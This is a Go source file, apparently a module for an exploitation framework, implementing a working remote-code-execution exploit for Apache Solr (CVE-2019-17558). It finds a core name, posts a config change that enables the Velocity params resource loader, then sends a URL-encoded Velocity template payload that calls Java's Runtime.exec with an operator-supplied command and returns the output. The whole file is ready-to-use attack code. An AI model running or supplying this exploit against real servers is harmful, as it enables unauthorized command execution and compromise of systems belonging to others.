package exp_Apache_Solr

import (
	"encoding/json"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
	"time"
)

type Exp_CVE_2019_17558 struct {
	exp_templates.ExpTemplate
}
type T struct {
	ResponseHeader struct {
		Status int `json:"status"`
		QTime  int `json:"QTime"`
	} `json:"responseHeader"`
	InitFailures struct {
	} `json:"initFailures"`
	Status struct {
		Demo struct {
			Name        string    `json:"name"`
			InstanceDir string    `json:"instanceDir"`
			DataDir     string    `json:"dataDir"`
			Config      string    `json:"config"`
			Schema      string    `json:"schema"`
			StartTime   time.Time `json:"startTime"`
			Uptime      int       `json:"uptime"`
		} `json:"demo"`
	} `json:"status"`
}
type T2 struct {
	ResponseHeader struct {
		Status int `json:"status"`
		QTime  int `json:"QTime"`
	} `json:"responseHeader"`
	WARNING string `json:"WARNING"`
}

func (self *Exp_CVE_2019_17558) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 构造payload
	headers := self.GetInitExpHeaders()

	httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/admin/cores?indexInfo=false&wt=json"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if strings.Contains(httpresp.Body, `responseHeader`) && strings.Contains(httpresp.Body, `name`) {
		T := T{}
		jsonErr := json.Unmarshal([]byte(httpresp.Body), &T)
		if jsonErr != nil {
			expResult.Err = jsonErr.Error()
			return
		}
		name := T.Status.Demo.Name
		self.EchoInfoMsg("核心名：" + name)
		enabled := "{\n  \"update-queryresponsewriter\": {\n    \"startup\": \"lazy\",\n    \"name\": \"velocity\",\n    \"class\": \"solr.VelocityResponseWriter\",\n    \"template.base.dir\": \"\",\n    \"solr.resource.loader.enabled\": \"true\",\n    \"params.resource.loader.enabled\": \"true\"\n  }\n}"
		headers.Set("Content-Type", "application/json")
		httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/"+name+"/config"), enabled, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		T2 := T2{}
		jsonErr = json.Unmarshal([]byte(httpresp.Body), &T2)
		if jsonErr != nil {
			expResult.Err = jsonErr.Error()
			return
		}
		status := T2.ResponseHeader.Status
		if status == 0 {
			self.EchoInfoMsg("params.resource.loader.enabled开启成功")
			payload := "/solr/" + name + "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cmd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
			payload = strings.Replace(payload, "cmd", url.PathEscape(cmd), 1)
			httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, payload), headers)
			if httpresp.Err != nil {
				expResult.Err = httpresp.Err.Error()
				return
			}
			expResult.Status = true
			expResult.Result = strings.Replace(strings.TrimSpace(httpresp.Body), "0", "", 1)
		} else {
			self.EchoErrMsg("params.resource.loader.enabled开启失败！")
		}
	} else {
		self.EchoErrMsg("未找到核心名或漏洞不存在！")
	}
	return
}

// func
func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2019_17558{}, "exp_CVE_2019_17558.yml")
}
